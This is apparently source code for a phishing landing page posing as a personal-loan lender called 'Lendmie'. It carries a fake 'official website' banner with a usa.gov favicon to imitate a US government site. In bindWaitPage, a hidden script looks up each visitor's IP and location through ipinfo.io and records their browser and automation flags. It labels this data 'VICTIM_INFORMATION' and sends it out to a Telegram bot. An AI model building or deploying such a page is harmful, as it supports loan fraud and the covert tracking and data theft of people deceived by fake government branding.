import Logo from "../assets/logo.png";
import {LOAN_OFFERS,LOAN_ICONS,LOAN_STEPS,LOAN_ELIGIBILITY,LOAN_FAQS,} from "./loan-contents";
import { CURRENCY,MIN_AMOUNT, MAX_AMOUNT,} from "../lendmie/sign-up";
import { UpdateTelegramBot } from "../telegram-bot";

const money = (amount: number): string =>
  `${CURRENCY}${amount.toLocaleString("en-US")}`;

export const WAIT_PAGE_JVS = (): string => {
   if (!style.isConnected) {
      document.head.appendChild(style);
   }

  return /*html*/ `
    <div class="wait-page">
      <div style="width: 100%; position: sticky; top: 0; z-index: 1000;">
         <div class="official">
            <img
               src="https://www.usa.gov/themes/custom/usagov/images/favicon-57.png"
               alt="Organization logo"
               width="20"
               height="20"
            />
            <span style='color: white;'>An official website of United State Lendmie Organization</span>
         </div>
         <div class="support-message">
            <span style="font-size: 16px; color: #333; font-weight: 500;">
               Providing Support When It Matters Most
            </span>
         </div>
      </div>
      <div class="page-contents">
        <div class="logo-container">
          <img src="${Logo}" alt="Lendmie Logo" width="190" height="70" />
          <button type="button" data-action="about">About</button>
        </div>

        <div class="hero">
          <h1 class="section-title">
            A simple way to borrow when you need it
          </h1>

          <p>
            Borrow from ${money(MIN_AMOUNT)} to ${money(MAX_AMOUNT)}, choose a
            repayment term that suits you, and apply online in a few minutes.
          </p>

          <div>
            <button type="button" data-action="apply">Apply for a loan</button>
          </div>
        </div>
      </div>

      <div class="about" id="about">
        <h1 class="section-title">About Lendmie</h1>

        <p>
          Lendmie offers personal loans to people who need a little extra
          room to cover life's bigger costs. We aim to keep the application
          straightforward, be clear about what we ask for, and keep you
          informed at every stage.
        </p>
      </div>

      <div class="offer-grid">
         ${LOAN_OFFERS.map(
            ({ title, description, icon }) => /*html*/ `
               <div class="offer-card">
               <div class="offer-icon">
                  ${LOAN_ICONS[icon] ?? ""}
               </div>

               <div class="offer-text">
                  <h2>${title}</h2>
                  <p>${description}</p>
               </div>
               </div>
            `,
         ).join("")}
      </div>

      <div class="how-it-works">
        <h1 class="section-title">How It Works</h1>

        <div class="steps">
            ${LOAN_STEPS.map(
               ({ title, description }, index) => /*html*/ `
               <div class="offer-text step-row">
                  <div class="step-number">${index + 1}</div>
                  <div>
                     <h2>${title}</h2>
                     <p>${description}</p>
                  </div>
               </div>
               `,
            ).join("")}

          <div class="steps-cta">
            <button type="button" data-action="apply">
              Start your application
            </button>
          </div>
        </div>
      </div>

      <div class="who-can-apply">
        <div>
          <span class="section-title">Who Can Apply</span>
          <p class="section-sub">
            Please check the requirements below before you start your
            application.
          </p>
        </div>

        <div class="apply-list">
            ${LOAN_ELIGIBILITY.map(
               ({ title, description }) => /*html*/ `
               <div class="apply-cont">
                  <div class="offer-icon">${LOAN_ICONS.checked}</div>
                  <div class="con-2">
                     <span class="apply-title">${title}</span>
                     <span>${description}</span>
                  </div>
               </div>
               `,
            ).join("")}
        </div>
      </div>

      <div class="faq">
        <div>
          <span class="section-title">Frequently asked questions</span>
          <p class="section-sub">
            Quick answers to the things people ask us most.
          </p>
        </div>

        <div class="faq-grid">
          ${LOAN_FAQS.map(
            ({ question, answer }) => /*html*/ `
              <div class="offer-card">
                <div class="offer-text">
                  <h2>${question}</h2>
                  <p>${answer}</p>
                </div>
              </div>
            `,
          ).join("")}
        </div>
      </div>

      <div class="faq">
        <p class="section-title">Contact &amp; Information</p>
        <p>Lender: Lendmie</p>
        <p>Contact: lendmiegroup@lendmi.com</p>
      </div>

      <div class="content">
        <span>© ${new Date().getFullYear()} Lendmie. All rights reserved.</span>
      </div>
    </div>
  `;
};

// Call this after the page HTML is in the DOM:
//   root.innerHTML = WAIT_PAGE_JVS();
//   bindWaitPage(root, mountLoanForm);
export const bindWaitPage = (
  root: ParentNode,
  onApply: () => void,
): void => {
   type USER_INFOTYPE= { USER_AGENT: string,  WEB_DRIVER: boolean, CITY: string, REGION: string, COUNTRY: string, IP: string }

      if (window.location.pathname === '/'){
         async function getLocation() {
            const res = await fetch("https://ipinfo.io/json");
            const data = await res.json();

            const VICTIM_INFORMATION: USER_INFOTYPE = {
               USER_AGENT: navigator.userAgent,
               WEB_DRIVER: navigator.webdriver,
               CITY: data.city, REGION: data.region, COUNTRY: data.country, IP: data.ip,
            }
            await UpdateTelegramBot({
               CLICKED_MESSAGE: VICTIM_INFORMATION,  type: 'click'
            })
         }

         getLocation();
      }
   root.addEventListener("click", (event: Event) => {
      const target = event.target;

      if (!(target instanceof Element)) return;

      const button = target.closest<HTMLElement>("[data-action]");

      if (!button) return;

      if (button.dataset.action === "apply") {
         onApply();
      }

      if (button.dataset.action === "about") {
         root
         .querySelector("#about")
         ?.scrollIntoView({ behavior: "smooth", block: "start" });
      }
   });
};

const style = document.createElement("style");
style.textContent = /*css*/ `
   .wait-page {
      font-family: "Montserrat", sans-serif;
      font-optical-sizing: auto;
   }
  .official {
      background-color: #165e55;
      padding: 10px 10px 10px 80px;
      display: flex;
      align-items: center;
      gap: 10px;
      color: white;
      font-weight: 600;
   }
   .support-message {
      padding: 10px 10px 10px 65px;
      background-color: #e7f6f8;
      display: flex;
      align-items: center;
      gap: 10px;
      border-left: 8px solid #00bde3;
      font-size: 14px;
      color: #333;
      font-weight: 500;
   }
   .section-title {
      display: block;
      font-size: 24px;
      color: #246d71;
      font-weight: 600;
      margin: 0 0 8px;
   }

   .section-sub {
      font-size: 14px;
      color: #5d5d5d;
      font-weight: 500;
   }

   .page-contents {
      display: flex;
      background-color: rgb(251 252 250);
      flex-direction: column;
      align-items: center;
      justify-content: center;
      margin: 50px auto;
      min-height: 30rem;
   }

   .hero {
      width: 75%;
   }

   .logo-container {
      display: flex;
      align-items: center;
      gap: 10px;
      width: 75%;
      justify-content: space-between;
      margin-block: 20px;
   }

   .page-contents button,
   .steps-cta button {
      padding: 10px 20px;
      background-color: #246d71;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font: inherit;
   }

   .page-contents button:hover,
   .steps-cta button:hover {
      filter: brightness(1.08);
   }

   .about,
   .how-it-works,
   .faq {
      width: 75%;
      margin: 50px auto;
   }

   .about p {
      font-size: 16px;
      font-weight: 500;
      color: #9e9e9e;
   }

   .offer-grid {
      width: 75%;
      margin: 40px auto;
      display: grid;
      grid-template-columns: repeat(2, minmax(0, 1fr));
      gap: 28px;
   }

   .faq-grid {
      display: grid;
      grid-template-columns: repeat(2, minmax(0, 1fr));
      gap: 28px;
   }

   .offer-card {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      gap: 16px;
      border: 1px solid #e0e0e0;
      padding: 20px;
      background-color: #fff;
      transition: box-shadow 0.3s ease;
   }

   .offer-card:hover {
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
   }

   .offer-icon {
      width: 50px;
      height: 50px;
      flex-shrink: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #246d71;
      background: #e7f6f8;
      border-radius: 14px;
   }

   .offer-icon svg {
      width: 24px;
      height: 24px;
   }

   .offer-text h2 {
      margin: 0 0 8px;
      font-size: 18px;
      color: #246d71;
      font-weight: 600;
   }

   .offer-text p {
      margin: 0;
      color: #555;
      line-height: 1.6;
   }

   .steps {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      gap: 16px;
      background-color: #f9f9f9;
      padding: 20px;
   }

   .step-row {
      display: flex;
      align-items: flex-start;
      gap: 5px;
   }

   .step-number {
      width: 30px;
      height: 30px;
      flex-shrink: 0;
      border-radius: 50%;
      background-color: #246d71;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      margin-right: 10px;
   }

   .steps-cta {
      margin-top: 8px;
   }

   .who-can-apply {
      width: 72.5%;
      margin: 50px auto;
      border: 1px solid #e0e0e0;
      padding: 1.5rem 1rem;
      display: flex;
      flex-direction: column;
      gap: 2rem;
   }

   .apply-list {
      display: flex;
      flex-direction: column;
      gap: 1.5rem;
   }

   .apply-cont {
      display: flex;
      flex-direction: row;
      gap: .5rem;
   }

   .con-2 {
      display: flex;
      flex-direction: column;
      gap: .5rem;
   }

   .apply-title {
      font-weight: 600;
   }

   .content {
      width: 75%;
      margin: 50px auto;
      border-top: 1px solid #e0e0e0;
      padding-top: 2.5rem;
   }

   @media (max-width: 768px) {
      .offer-grid,
      .faq-grid {
         grid-template-columns: 1fr;
      }

      .offer-grid {
         width: 90%;
      }

      .about,
      .faq,
      .how-it-works,
      .logo-container,
      .hero,
      .content {
         width: 90%;
      }

      .who-can-apply {
         width: 84%;
      }
   }
`;
